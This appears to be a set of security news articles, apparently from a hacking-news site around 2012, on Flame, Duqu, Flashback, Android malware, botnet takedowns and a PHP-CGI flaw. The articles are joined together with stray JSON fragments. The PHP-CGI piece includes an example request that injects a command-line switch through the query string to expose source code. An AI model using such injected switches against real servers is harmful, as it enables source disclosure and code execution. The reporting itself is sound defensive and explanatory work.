microphone, storage devices, network, wifi, Bluetooth, USB and system processes. Flame is a Swiss Army Knife of malware in the sense that it can intercept everything imaginable, but it is not a pile of existing malware code thrown together. It is very cleverly crafted. Like Stuxnet, it has multiple propagation vectors – USB keys, printer sharing, and domain controller rights to name a few. No security vendor has pointed out a single country or group as being responsible for Flame's creation.The central matter of contention at the moment is whether the malware was made by a private group or a nation state. Bitdefender released a tool to find and remove the Flamer attack toolkit. Download the 32-bit or the 64-bit removal tools." }

The attacks, which have been occurring since late this past March, have targeted several of the country's natural gas pipeline companies. According to U.S. officials, it's unclear if a foreign power is trying to map the gas systems or if hackers are attempting to harm the pipelines. A previous attack on the oil and gas sector seemed to originate in China. DHS supplied the pipeline industry and its security experts with digital signatures, or \"indicators of compromise\" (IOCs). Those indicators included computer file names, computer IP addresses, domain names, and other key information associated with the cyberspies, which companies could use to check their networks for signs they’ve been infiltrated. DHS officials and a spokesman have acknowledged they are working with the FBI to find out who may be behind the intrusions and malicious emails. The Monitor reports that some investigators now believe that the campaign is tied to another attack last year against cybersecurity company RSA, which the head of the National Security Agency told Congress could be traced back to China. The group responsible for the RSA attacks has also been linked to several previous hacking incidents around the globe.Politico reports that these recent attacks, combined with the devastating 2010 natural gas pipeline explosion in California, illustrate the potential dangers of the rapidly expanding gas pipeline network. The oil and gas sector has been targeted before. In February 2011 the computer security firm McAfee discovered a computer intrusion labeled \"Night Dragon\" that was traced to China. As part of that attack, individuals tried to obtain sensitive data and financial documents from the oil and gas companies about bids and future drilling exploration projects. [Source]" }

Malicious Java code was planted on the site in a bid to push the Gh0st RAT Trojan onto vulnerable Windows machines. If successful, the attack plants malware onto machines that is capable of extracting the user's files, email, passwords and other sensitive personal information. The vulnerability for the infection stemmed from a popular Java exploit, CVE-2012-050. Hackers exploited that hole and used it to inject the Amnesty International site’s script with malicious code. The Java hole was the same used by Flashback, the much buzzed-about Mac OS X Trojan in recent months. The exploit code used in this attack appears to have been copied from Metasploit, an open source penetration testing framework popular among security professionals, Giuliani said. The injected web code was removed after Websense alerted Amnesty to the issue.The attack bears all the hallmarks of a series of attacks that appear to be targeting pro-Tibet organisations and sympathisers, most likely by a group connected to China. The Gh0st Trojan has been used by suspected Chinese hackers in several advanced persistent threat (APT) style attacks, most notably the ‘Nitro’ attacks against energy firms in 2011. Chinese involvement in the Amnesty International attack is suspected but unproven. Websense detected over 100 other websites infected with the same malicious code as Amnesty International's U.K. website during the same time period, Carl Leonard, senior manager of Websense Security Labs, said." }

Criminal hackers are experimenting with different business models for mobile devices, such as tricking users into subscribing to pay-text-message services that the criminals control. Android app security holes have long been a concern because of the mobile operating system's more open architecture and the app market's less stringent standards for developers than others such as Apple's iOS or Research In Motion's BlackBerry OS.Earlier this year, Google said it was using a service called Bouncer that automatically polices its app market and takes down offenders before they strike. Mahaffey, who studied Internet browsing data from Android gadgets to draw his conclusions, said an attacker could latch on to a business or government network if an employee whose Android device has been infected with NotCompatible accessed their corporate information via Wi-Fi. With over 600 million Android devices in the world, the purveyors of malware will always be seeking ways to infect your Android device. The worst kind of update you can download to your machine is one that you didn’t ask for and don’t know where it comes from." }

PHP-CGI-based setups contain a vulnerability when parsing query string parameters from php files. The developers were still in the process of building the patch for the flaw when it was disclosed Wednesday, But the vulnerability can only be exploited if the HTTP server follows a fairly obscure part of the CGI spec. According to advisory (CVE-2012-1823) , PHP-CGI installations are vulnerable to remote code execution. You can pass command-line arguments like the “-s” switch “show source” to PHP via the query string. For example, You could see the source via “http://localhost/test.php?-s” . A remote unauthenticated attacker could obtain sensitive information, cause a denial of service condition or may be able to execute arbitrary code with the privileges of the web server. The team that found the bug, known as Eindbazen. They said that it had been waiting for several months for the PHP Group to release a patch for the vulnerability in order to publish information about the bug. What this vulnerability can do ? It can help attacker to find out database passwords, file locations etc and Execute any file on the server’s local disk. Most important , using some trick if you have the possibility to upload a file to the server, execute any code. So, When PHP is used in a CGI-based setup the php-cgi receives a processed query string parameter as command line arguments which allows command-line switches, such as -s, -d or -c to be passed to the php-cgi binary, which can be exploited to disclose source code and obtain arbitrary code execution." }

The Mehr News Agency, which is a semi-official arm of the Iranian government, reported Monday that the country's principal oil terminal on Kharg Island was disconnected from the Internet as part of the response to the attacks. Email systems associated with the targets were also pulled offline. Iranian officials said the virus attack, which began in earnest Sunday afternoon, had not affected oil production or exports, since the industry was still primarily mechanical and does not rely on the Internet. Officials said they were disconnecting the oil terminals and possibly some other installations in an effort to combat the virus. Cyberattacks by well-resourced, highly capable and relentless, usually state-sponsored attackers so called advanced persistent threats are growing. The best known example is Stuxnet, which was aimed at Iran’s nuclear centrifuges and is widely believed to have been developed by the US or Israel, neither of which have confirmed their involvement.

These motion sensors are useful in supporting the mobile UI innovation and motion-based commands. However, they also bring potential risks of leaking user’s private information as they allow third party applications to monitor the motion changes of smart phones. A team of researchers from Pennsylvania State University (PSU) and IBM have devised an Android-based Trojan that can use a handset's onboard movement sensors to crack passwords. The team created an experimental app called TapLogger, which is based on the premise that when you tap on your touch screen, you're not just interacting with the screen, but moving the entire device. So if you hit a button in the upper right corner, your phone will actually move in that direction slightly, and that subtle movement is then read by the accelerometer and other sensors built-in to your device. TapLogger was created by Zhi Xu, a PhD candidate in the Department of Computer Science and Engineering at PSU, Kun Bai, a researcher at IBM T.J. Watson Research Center and Sencun Zhu, an associate professor of Computer Science and Engineering at PSU's College of Engineering. Accelerometer and orientation sensor data are not protected under Android’s security model, and this means that they are exposed to any application, regardless of its permissions on the system, the research team said in a paper that was presented during the ACM Conference on Security and Privacy in Wireless and Mobile Networks on Tuesday. In August 2011, a pair of researchers from University of California proposed a similar attack and designed a concept application called TouchLogger to demonstrate it." }

A remote access computer Trojan (RAT) designed to steal credit card details from hotel point-of-sale (PoS) applications is being sold on the underground forums, according to researchers from security firm Trusteer. Trusteer, the world’s leading provider of secure web access services, detected these schemes and says hotel poaching is a virile trade in underground and tech forums. Attack codes can be purchased in Visa underground forums for $280 and the spyware cannot be detected by anti-virus software. The package even includes a manual loaded with tips on how the poacher can trick the desk clerk into loading the spyware for them. Malware writers often repackage their malicious installers with new algorithms in order to evade signature-based antivirus detection, said Bogdan Botezatu, a senior e-threat analyst at antivirus vendor BitDefender. \"The fact that the RAT's creator decided to target the hospitality industry is consistent with a recently observed change in the focus of cybercriminals - an expansion from online banking attacks to attacks against PoS systems, Criminals are increasingly expanding the focus of their attacks from online banking targets to enterprises,\" said Trusteer's CTO Amit Klein.

In the last few of months, several security vendors have reported targeted attacks that distributed malware designed to steal confidential information from people or organizations supporting the Tibetan cause. This tactic recently re-surfaced during our monitoring of Tibetan-leveraging malware campaigns. It came in the form of BKDR_RILER.SVR, a backdoor that arrives infected by PE_SALITY.AC. A simple Spear Phishing technique was used recently to trick Tibetan activists into opening malicious PDF email attachments, by quoting a legitimate email message sent by FireEye's Lanstein to people who submitted Tibet-related malware samples to the VirusTotal online antivirus scanning service. According to Trend Micro researcher Ivan Macalintal, by exploiting a vulnerability, the attachment - Next Generation Threats.pdf - drops a malicious JavaScript that in its turn drops a RAT that connects to a IP address located in China. There are a few hints that the people behind the attack are Chinese. The email text was recreated under a key official character set of the People's Republic of China, and in the footer of the decoy PDF file a few Chinese characters can be found. The said backdoor communicates the following information to the IP address about IM IDs and password, List of drives and files, User account names and passwords. The social engineering techniques used in these attacks are increasingly sophisticated and the distributed malware is capable of infecting both Windows and Mac OS X computers. On Friday, researchers from antivirus firm Kaspersky Lab reported the discovery of a new Mac OS X backdoor which they named SabPub. Tibetan activists are on a long hit list uncovered by Trend Micro and dubbed the Luckycat campaign it uses spear-phishing to inject Windows malware, and targets military and other sensitive entities in India and Japan as well as Tibetan activists." }

The new LeNa seems like a fully functional copy of popular apps, like \"Angry Birds Space,\" and, according to Lookout, \"hides its malicious payload in the string of code at the end of an otherwise genuine JPEG file.\" Well ! Before you download any app, check the permissions it requests, if you're uncomfortable with the amount of access to your phone an app wants, don't download it. For now, Android users who are only downloading apps from Google Play (Android Market) are safe. The new version of LeNa has been spotted on third-party Chinese app websites." }

Last week we posted about, More than 600000 Macs system infected with Flashback Botnet. That's slightly more than 1 percent of all 45 million Macs in the world still a relatively small number, but a worrisome one for Mac users, as the tally of infected machines continues to grow. FlashBack Checker - 38KB tool was created by Juan Leon, a software engineer at Garmin International, the Kansas-based company best known for its GPS devices. When Flashback Checker is run, it displays \"No signs of infection were found\" or provides additional information if it does detect changes the malware has made to the Mac. According to Dr. Web, the Russian security company that was the first firm to quantify Flashback infections, nearly 2% of all Macs have been hit by the malware. Dr. Web used a different technique to detect Flashback than Leon. Rather than examine the Mac itself, Dr. Web's tool compares the UUID (universally unique identifiers) of a machine to the list of UUIDs of infected Macs it compiled after commandeering a hacker command-and-control (C&C) server. To help tackle the recent Flashback malware threat, Apple released a couple of updates for the Java runtime in OS X to bring it up to the latest Java release (version 1.6.0_31), which patches the vulnerability being exploited. The download is posted to github and can run on Mac OS X10.5 and above. Leon also posted the source code for those interested in checking it out." }

Researchers at NQ Mobile, working alongside researchers at North Carolina State University, have discovered this Android malware called \"TigerBot\", differs from “traditional” malware in that it is controlled via SMS rather than from a command & control (C&C) server on the Internet. A common aspect of Android malware is the use of a command and control server that tells the malware what to do next and acts as a repository for any captured passwords or banking information. The current information about this malware show that it can execute a range of commands including uploading the phone’s current location, sending SMS messages, and even recording phone calls. It works by intercepting SMS messages sent to the phone and checking to see if they are commands for it to act. If they are, it executes the command and then prevents the message from being seen by the user. TigerBot tries to hide itself from the user by not showing any icon on the home screen and by using legitimate sounding app names (like System) or by copying names from trusted vendors like Google or Adobe. Based on our current analysis, it supports the following commands:Record the sounds in the phone, including the phone calls, the surrounding sounds and etc. Change the network setting. Upload the current GPS location. Capture and upload the image. Send SMS to a particular number. Reboot the phone. Kill other running processes. To avoid becoming a victim, Only download applications from trusted sources, reputable application stores, and markets, and be sure to check reviews, ratings and developer information before downloading." }

Dr. Web originally reported Wednesday that 550,000 Macintosh computers were infected by the growing Mac botnet. But later in the day, Dr. Web malware analyst Sorokin Ivan announced on Twitter that the number of Macs infected with Flashback had increased to 600,000, with 274 of those based in Cupertino, Calif. Dr. Web explained that a system gets infected with the Mac Flashback trojan \"after a user is redirected to a bogus site from a compromised resource or via a traffic distribution system.\" A specific JavaScript code on the site that contains the virus is then used to load a Java applet, which is how the malware makes its way onto a user's computer. This Trojan spreads via infected web pages and exploits Java vulnerabilities that have been known for some time, yet Apple didn’t see fit to release a patch until this week (Java for Mac OS X 10.6 Update 7 and Java for OS X Lion 2012-001). Macs have historically been an unappealing hacking target because of their low market share. Instead, criminals have attacked personal computers running Microsoft Corp.’s Windows software, seeking the biggest number of victims for illicit moneymaking schemes. Windows runs on more than 90 percent of the world’s desktop computers, according to market researcher Net Applications. 'All the stuff the bad guys have learnt for doing attacks in the PC world is now starting to transition to the Mac world,' McAfee Labs director of threat intelligence Dave Marcus told. Once installed, the Flashback will inject code into Web browsers and other applications like Skype to harvest passwords and other information from those program's users.Security company F-Secure has published instructions on how to determine whether a Mac is infected with Flashback. 'There has been a significant increase in Mac malware in the last several quarters, so what we've seen with the Flashback Trojan isn't particularly surprising,' Marcus said.'Cybercriminals will attack any operating system with valuable information, and as the popularity of Macs increase, so will attacks on the Mac platform.'" }

This malware is identified when monitoring and analyzing the evolution of earlier DroidKungFu variants. What sets DKFBootKit apart from malware like DroidDream, is that DKFBootKit replaces certain boot processes and can begin running even before the system is completely booted up. DKFBootKit repackages legitimate apps by enclosing its own malicious payloads in them. However, the victim apps it chooses to infect are utility apps which require the root privilege to work properly. NQ says the malicious code has already infected 1,657 Android devices in the past two weeks and has appeared on at least 50 different mobile apps. These apps seem to have legitimate reasons to request root privilege for their own functionality. It is also reasonable to believe that users will likely grant the root privilege to these apps. DKFBootKit makes use of the granted root privilege for other malicious purposes, namely comprising the system integrity. In order to avoid being infected by this beast, NQ recommends three commonsense steps: First, don't download any apps from sketchy app stores. Second, don't accept app permissions from unknown sources and always be sure to read the permissions an app is requesting. Third, download a security app that can scan your apps for you to search for malicious code. NQ Mobile Security for Android is available for download." }

Interpol Chief Ronald Noble on Friday warned that a group of hackers might try to shut down internet service tomorrow. The hacking group, Anonymous, is protesting against several reasons including the crash of Wall Street and irresponsible leaders. There are 13 DNS servers that host the core databases for translating IP addresses. Anonymous hackers have announced \"Operation Global Blackout\", promising to cause an Internet-wide blackout by disabling the core DNS servers. Anonymous Hackers wants to bombard those 13 servers with traffic using a distributed denial of service attack. If the servers get too overloaded, they’ll crash and therefore be unable to fulfil DNS lookups rendering all domain names useless. But there are lots of Limitations in this type of attack :There are 13 Root Servers out there, It it not possible to shut down every of them. Even every root server is under control of various companies and they have different hardware and different ways to protect it. If any root server will get down, They can migrate it to other servers. Anonymous Issue the Date i.e 31 march 2012 for there attack, obviously there will be 100's of Security Experts aware about the attack and working at backend for Security and resolving the issues. Internet users don't use Root servers service directly, they are the master servers. Whereas internet users are connected to slave servers , provided by their internet service provider (ISP). Slave servers synchronice there data with root servers (master servers). Root servers are implemented as clusters of hosts using anycast addressing. Anycasting is a tweek to the Internet routing table so that traffic destined for an IP address is redirected to a different local server. Meanwhile, Interpol has launched Operation Unmask to deal with the group and arrested 31 alleged members in two different phases in February and March, 2012. There are around 2.3 billion internet users in the world and more than one million of them are affected by cybercrime every year while $388 billion dollars is the global cost of such crimes. Conclusion : According to us ( The Hacker News) , Hackers strongly not able to shut down the internet. So what do you think , that Anonymous will manage to shut down the web?" }

The main problem is that legitimate security companies can’t use the same type of weapons as criminals. A group of malware experts from security companies Kaspersky Lab, CrowdStrike, Dell SecureWorks and the Honeynet Project, have worked together to disable the second version of the Kelihos botnet, which is significantly bigger than the one shut down by Microsoft and its partners. Kelihos is used to send spam, carry out DDoS attacks, and steal online currency such as bitcoin wallets. It operates as a so-called \"peer-to-peer\" bot network, which are more difficult to take down than those with a centralized command and control servers (C&C), according to Tillmann Werner, a senior researcher at CrowdStrike. Seculert reports that Kelihos-B, which was distributed as a Facebook worm over recent weeks, is still active and spreading - even after the shutdown attempt by CrowdStrike and Kaspersky Labs this week. The peer-to-peer Kelihos botnet, also known as Hlux, was sucked into a 'sinkhole' by a small group of security experts from Kaspersky Lab, Dell SecureWorks, CrowdStrike Intelligence Team and the Honeynet Project. It's unclear who is behind Kelihos, he said. It was created last October after Microsoft used a sinkhole to halt the original Kelihos botnet, which had infected about 41,000 computers.The latest Kelihos used servers with hosts registered in Sweden, Russia and Ukraine that were controlled by a botmaster, according to CrowdStrike. The machines are still infected, and the researchers are relying on ISPs to inform affected users. What is to say this botnet won’t just morph itself again? “That is a possibility,” said Crowdstrike’s Mr. Meyers. “But when that happens, we’ll be there to take it back down.”" }

The rogue extensions are advertised on Facebook by scammers and claim to allow changing the color of profile pages, tracking profile visitors or even removing social media viruses. The attacks manifest as suggestions to download Facebook apps. Those apps are, alas, not real. Instead they are malware and, in one case, a malware-laden Chrome extension hosted in Google's very own Chrome Web Store. To do that, they must follow a series of steps, which include installing a fake Adobe Flash Player Chrome extension. The launchpad for the fake Flash Player is a Facebook app called “Aprenda”. If Aprenda is installed it redirects users to Chrome Web Store, encouraging them to install the fake Flash extension. “This last one caught our attention not because it asks the user to install a malicious extension, but because the malicious extension is hosted at the official Google's Chrome Web Store. If the user clicks on ‘install application’ he will be redirected to the official store. The malicious extension presents itself as “Adobe Flash Player”, wrote Fabio Assolini. \"Be careful when using Facebook. And think twice before installing a Google Chrome extension,\" he adds. Uploading multiple rogue extensions on the Chrome Web Store and running several Facebook spam campaigns to advertise them allows attackers to quickly compromise thousands of accounts. The malware operates in much the same way as other Facebook scams, such as inviting friends to install it, however the purpose of the highjacking accounts is to generate fraudulent \"Likes\" which are sold for about US$27 per 1,000. Now, the extension Assolini found was concentrated in Brazil, where Chrome enjoys 45% of the browser market and Facebook is by far the most popular social network. That does not, however, mean that the problem is isolated to Brazil. The malicious extension was installed in numerous countries, including the U.S.. With these potential security risks in mind, \"Think twice before installing a Google Chrome extension\"." }

The international scientific community has defined a Stuxnet deadly weapon because been designed with a detailed analysis of final target environment supported by a meticulous intelligence work that for the first time in history has embraced the world of information technology. The agent was designed with the intent to strike the Iranian nuclear program and even more clear is who has always opposed such a program, U.S. and Israel first, and consider also the technology skill necessary to develope a weapon with the observed architecture is really high. Extremely important two factors af the event:1. the choose of control systems as target of the malware.2. the conception of the virus as an open project, a modular system for which it was designed a development platform used to assemble the deadly cyber weapons in relation to the final targets. Regarding the second point, it has been discovered a platform behind Stuxnet called “Tilded Platform“, used also for the development of Duqu malware, and that make possible the development of a set of reusable tools, a true innovation that make possible the composition of ever new and enhanced agents with modules developed to fulfill specific functions against clearly defined targets. As previously stated Duqu has some interesting features such as:Modularity of its structure. In isolated instances of the malware, unlike Stuxnet, it would not seem to be equipped with modules for SCADA systems attack. It is only able to steal information from the host system. The malware, such as Stuxnet has characteristics that demonstrate innovative techniques behind its development. We suppose that a team of specialists with high technical skills has been engaged to project the most innovative cyber weapon. According the ENISA Duqu Analysis there are important differences between Duqu and Stuxnet. The 2010 Kaspersky analysis [Gostev 2011] concluded that Stuxnet consists of the two parts: 1. A component responsible for the propagation of the malware (a carrier platform).2. A separate module targeting Programmable Logic Controllers (an attack module). According to Kaspersky, the carrier platform of Stuxnet could be reused, for example with a different attack module. But, unlike Stuxnet, DuQu can also be reconfigured remotely to install new malware payloads and to direct attacks at new targets. The attack module of DuQu, found together with the detected samples was a general purpose keylogger (enriched with some additional spying capabilities) able to perform a reconnaissance in any organization. However, according to Symantec, the aim of DuQu is to infiltrate organizations operating in industrial environments. This conclusion is based on the fact that the majority of the detected threats were found in industrial infrastructures, and because of the connection to Stuxnet code. Unlike Stuxnet, DuQu is an intelligence gathering tool, apparently aiming to prepare the ground for attacks such as Stuxnet. It should be emphasised, however that there is no direct evidence for the intentions behind DuQu But if Duqu has no components to attack SCADA systems or similar, why create in us so much worry? Remember that we defined modular Duqu? Well this is the feature I think that should cause us to jump from the chair. To date we have isolated versions of malware orphan of those components to attack specific critical systems, but it is reasonable to assume that the same Duqu is a work in progress project. The ability to compose its structure at different times using modules designed specifically for precise goals, makes this unique and formidable. What occurred in the Stuxnet case has raised media attention demonstrating the total inadequacy of the defense systems of critical infrastructures across the world. Many, too many, the SCADA systems around the world, achievable in an easy manner and easily attacked by evil-minded because they are un protected, exposed on the web for maintenance purpose, and configured with the factory settings easily available even with simple searches on the web. Also for that SCADA systems deployed without security and isolated from the Internet there is a concrete risk to be infected using USB memory sticks. While in recent weeks, the Iranian government declared definitively defeat the threat Stuxnet in the last month there are many news published on the web related to malware Duqu. The mistery of Duqu sorce codeThe first one was related the identification of the mysterious language used in the DuQu virus. Researchers at Kaspersky Lab requested the help of international experts after failing to figure out the language on their own.Thanks to help from programmers has been discovered that the language, which DuQu used to communicate with C&C (command & control) servers, is a special type of C code compiled with the Microsoft Visual Studio Compiler 2008. Despite the long period of study conducted on the agent the component of the source written in C remained a mystery. It's a vital part for Duqu used to communicate with C&C servers, download additional payload modules and execute them on infected machines. The code was C code compiled with Microsoft Visual Studio Compiler 2008 using options 01 and Ob1 in the compiler to keep the code small optimizing execution time and size of the source code. The use of object-oriented C dialect, generally called “OO C, to write the event-driven code in the malware reveals that authors who coded this part of DuQu were probably old-school programmers, their style is uncommon for malware and is more commonly found in professionally-produced commercial software created ten years ago, according Costin Raiu, director of Kaspersky Lab's global research and analysis team.Another important factor in choose of C language instead other more powerful like C++ it the necessity to grant portability of the agent that maybe must be compiled with several standard compiler in different environments. This requirement indicate us that the agent could be used to attack other platforms, not necessary Widows based. “Obviously when you create such a complex espionage tool, you take into account that maybe some day you will run it on servers, maybe you will want to run it on mobile phones or God knows what other devices, so you just want to make sure your code will work everywhere,” Raiu says. The Duqu evolutionNews of these days is that a new variant of Duqu has been isolated, the event confirm the hypothesis made on the evolution of the malware, a work still in progress that will propose in the next year several instances customized to attacks specific targets. The variant found was designed to evade detection mechanism of antivirus products and other security systems. Vikram Thakur, principal security response manager at Symantec, announced that the new Duqu Driver has been identified, let's remind that the module is used for loading the malware's encrypted body stored on the systems. The driver is called mcd9x86.sys and it was compiled on Feb. 23. What is changed in the new driver?The source code appears to be reshuffled and compiled with a different set of options and it also contains a different subroutine for decrypting the configuration block and loading the malware's body. A similar operation has been already observed in October 2011. Of course also the references to C&C server are changed because all old structures were shut down on Oct. 20, 2011. Unfortunately the addresses of this server are not known because principal security firm don't have the full Duqu body but only the loader in the form of the driver, the loader does not contact the C&C directly, it only loads the main body which is stored in encrypted form. What we expect from the future?Surely we will confront with new and dangerous cyber threats that can offend the military and also private sector. Agents such as Stuxnet and Duqu are children of an ambitious and complex project that wants to be able to provide an \"evolutionary\" threat. Prepare to have to deal with new modules and new features designed to attack specific targets. Let me raise serious doubts on the immediate effectiveness of preventive measures against this new generation of cyber weapons because the industry in general is still too vulnerable. Possible evolutions of malware could cause serious damage to infrastructures that use the systems in question. The only way to emerge unscathed from this awkward situation is a close collaboration between industry, leading manufacturers of control systems and governments, hoping that security will become a requirement in the design phase.

The 'fileless' bot is more difficult for antivirus software to detect, and resides in memory until the machine is rebooted. This Malware doesn't create any files on the affected systems was dropped on to the computers of visitors to popular news sites in Russia in a drive-by download attack.Drive-by download attacks are one of the primary methods of distributing malware over the web. They usually exploit vulnerabilities in outdated software products to infect computers without requiring user interaction. The attack code loaded an exploit for a known Java vulnerability (CVE-2011-3544), but it wasn't hosted on the affected websites themselves. Once the malware infected a Microsoft machine, the bot disabled User Account Control, contacted a command and control server and downloaded the 'Lurk' Trojan. The malware also attacked Apple devices. The Java exploit's payload consisted of a rogue DLL that was loaded and attached on the fly to the legitimate Java process.Normally this malware is rare, because it dies when the system is rebooted and the memory is cleared. But the hackers do not really care because there is a good chance that most victims would revisit the infected news websites.Once the malicious DLL loaded into memory it sends data and receives instructions from a command and control server over HTTP." }

The sections responsible for downloading and executing additional modules in the Duqu Trojan, referred to by some as Stuxnet 2.0, were written in standard C++. Kaspersky Lab experts now say with a high degree of certainty that the Duqu framework was written using a custom object-oriented extension to C, generally called “OO C” and compiled with Microsoft Visual Studio Compiler 2008 (MSVC 2008) with special options for optimizing code size and inline expansion. Kaspersky’s Igor Soumenkov wrote, “No matter which of these two variants is true, the implications are impressive. The Payload DLL contains 95 Kbytes of event-driven code written with OO C, a language that has no automatic memory management or safe pointers,”. Kaspersky’s analysis now concludes:The Duqu Framework consists of “C” code compiled with MSVC 2008 using the special options “/O1″ and “/Ob1″ The code was most likely written with a custom extension to C, generally called “OO C” The event-driven architecture was developed as a part of the Duqu Framework or its OO C extension The C&C code could have been reused from an already existing software project and integrated into the Duqu Trojan The Duqu Framework may have been created by a different programming team, since it is unique to Duqu, unlike many parts of Duqu that seem to be directly borrowed from Stuxnet. It’s believed that the developers are old school that don’t trust C++ and that’s probably why they relied on C. Another reason for using OO C is because back in the good old days it was more portable than C++. Knowing the techniques used to develop the malware allows Kaspersky's researchers to make better guesses about who might be behind the code. Creating Duqu was a major project, so it’s possible that an entirely different team was responsible for creating the Duqu Framework, while others worked on creating drivers and system infection exploits. In this scenario it's even possible that those who created the Duqu framework were ignorant of the real purpose of their work. Duqu was first detected in September 2011, but Kaspersky Lab believes it has seen the first pieces of Duqu-related malware dating back to August 2007. The Russian security firm also notes Duqu, like Stuxnet before it, is highly targeted and related to Iran’s nuclear program." }

Code that was submitted to Microsoft last year to demonstrate a serious exploit in Windows has somehow made it into the wild, either through Redmond itself or one of its security partners. The exploit targets a vulnerability in Windows' remote desktop protocol, giving an attacker full control over a system and the ability to easily spread to other machines with remote desktop enabled. Security researchers raised alarms when a working exploit for the flaw was spotted in China shortly after the release, leading many to believe that malware writers were able to breach the Microsoft Active Protections Program security platform. \"The details of the proof-of-concept code appear to match the vulnerability information shared with Microsoft Active Protections Program partners,\" said Yunsun Wee, Microsoft's director of its Trustworthy Computing effort. The patches for the new hole were distributed on Tuesday, as part of Microsoft's regular monthly cycle for security fixes. The hole is a very serious one, because full exploitation would allow an attacker to control machines running Windows XP and later Windows versions that have Remote Desktop Protocol enabled, as long as the network doesn't demand authentication.

Security researchers at McAfee have discovered a malicious Android application capable of grabbing banking passwords from a mobile device without infecting the user’s computer. From a McAfee blog post on the subject, penned by Malware Researcher Carlos Castillo: \"To get the fake token, the user must enter the first factor of authentication (used to obtain initial access to the banking account). If this action is not performed, the application shows an error. When the user clicks “Generar” (Generate), the malware shows the fake token (which is in fact a random number) and sends the password to a specific cell phone number along with the device identifiers (IMEI and IMSI). The same information is also sent to one of the control servers along with further data such as the phone number of the device.\" The app also includes a number of nasty lines of code that could be used to obtain users' contact lists and then send them off to a control server. \"From man-in-the-middle attacks we now see more sophisticated, remote-controlled banking Trojans that can get more than one factor of authentication and update itself to, for example, modify a phishing attack to get other required credentials–such as the name or the ID number of the user–to perform electronic fraud,\" writes Castillo. \"Due to the increasing popularity of Android and mobile-banking applications, we expect that more threats like this will appear.\" If Mobile banking does take off, beware, since the Android security architecture won't be able to stop those types of attacks, given the ease with which users can be tricked, via social engineering attacks, into installing third-party applications." }

The Russian security company says this new information could help them discover how the worm was able to communicate with its Command and Control (C&C) servers. The C&C servers essentially tell the worm what to do once it has accessed a system. While the majority of Duqu is written in C++, the Framework was not and was not compiled with Microsoft’s Visual C++ 2008. Other languages ruled out include Python, Java, Objective C, Ada and Lua.“Given the size of the Duqu project, it’s possible that an entirely different team was responsible for creating the Duqu Framework as opposed to the team that created the drivers and wrote the system infection exploits,” said Alexander Gostev, chief security expert at Kaspersky Lab, in a statement. The mysterious code could be the work of a separate collaborator, indiciating that multiple parties worked to develop the infection. Kaspersky is hoping that someone in the programming community will recognize it and come forward to identify it. Identification of the language could help analysts build a profile of DuQu’s authors, particularly if they can tie the language to a group of people known to use this specialized programming language or even to people who were behind its development. Duqu first emerged in September 2011 and is thought to have been written by the same people behind the infamous Stuxnet worm, which targeted Iran's nuclear facilities and attempted to steal highly sensitive information. Duqu worked along the same lines; acting as a backdoor into a system to steal data. Researchers have noted a number of similarities in the behaviour and spread of Duqu with the infamous Stuxnet malware, leading some researchers to dub Duqu as the successor to Stuxnet." }

This piece of information was released along with other details of the upcoming Windows Store for Windows 8. Anyone worried about Microsoft having complete access to your computer can rest easy for now. The company has stated that they can only “kill” programs downloaded from its new Microsoft App Store. This is what the company has to say about it in official terms: -“In cases where your security is at risk, or where we’re required to do so for legal reasons, you may not be able to run apps or access content that you previously acquired or purchased a license for,”. Any software loaded from a flash drive, DVD, or directly from the Web will remain outside Microsoft’s control. Still, the kill switch is a tool that could help Microsoft prevent mass malware infections. “For most users, the ability to remotely remove apps is a good thing,” says Charlie Miller, a researcher with the security company Accuvant. Hiroshi Lockheimer, Google’s vice president of Android engineering, says the search company reserves the use of the kill switch for “really egregious, really obvious cases” of harmful content. Microsoft’s Biggs says the company has used the functionality in its smartphones only for “technical issues and content issues.” Apple declined to comment. Amazon did not respond to several messages. Nonetheless, a “kill switch” for curators of online applications marketplace is common as companies try to protect users of the platforms they develop from malware or hacking attempts implemented through applications.Microsoft’s upcoming Windows 8 operating system is expected to be launched by the middle of next year." }

Security firm, Sophos have reported that there is malware going around via the Facebook application. The malicious software disguises itself as an Android app named “any_name.apk” or “allnew.apk” and is sent to Android phones via Facebook’s mobile app. An Android user may receive a Facebook friend request and if the user goes to the requester’s profile to check them out, they could be diverted to another web page instead, where the malicious app will be automatically downloaded. Although Android doesn’t by default allow apps to be automatically downloaded, some users choose to turn off this protection in order to have access to apps distributed outside of the Android Market. This kind of malware is similar to clickjacking, which takes place very often on Facebook. Bouncer is a good first step towards protecting Android users, but regardless of what methods are used to lock down the Android Market, spammers and scammers can always find another way in." }

A former McAfee researcher \"Dmitri Alperovitch\" has used a previously unknown hole in smartphone browsers to plant China-based malware that can record calls, pinpoint locations and access user texts and emails. He conducted the experiment on a phone running Android operating system, although he saysApple Inc.'s iPhones are equally vulnerable. Android is particularly vulnerable because it has become the main operating system for mobile devices. Today most smartphones are android-based therefore there is a huge dividend for hackers to write Android-targeted malware compared to other operating systems. Alperovitch, who has consulted with the U.S. intelligence community, is scheduled to demonstrate his findings Feb. 29 at the RSA conference in San Francisco, an annual cyber security gathering. Alperovitch and his team reversed engineered the malware called Nickispy and and took control of it. A nice little piece of Android spyware, commonly known as 'NickiSpy.C' . For those unfamiliar, NickiSpy gained quite a bit of notoriety around July/August 2011, as it was one of the first malicious Android applications to have the ability to record phone calls. Alperovitch said he exploited a so-called zero-day vulnerability in smartphone browsers to secretly install the malware. Zero-day vulnerabilities are ones that are not yet known by the manufacturers and anti-virus companies. The malware also intercepts texts and emails and tracks the phone's location, he said. In theory, it could be used to infiltrate a corporate network with which the phone connects. Like most pieces of Android spyware/malware, installation is dependant on the end-user. In an experiment he also delivered it through a classic \"spear phishing\" attack. Protect from Malware : For Android, the danger is downloading apps outside of Google's App Market . If you're off somewhere getting apps from sources you don't know or trust, there could be consequences. For iPhone users, the line really is whether you jailbreak or not. Jailbreaking can be pretty easy, and getting pirated or bootlegged apps can seem like a great way to save money, but in doing so, you're basically handing out the smart phone equivalent of a front door key to Lord only knows." }

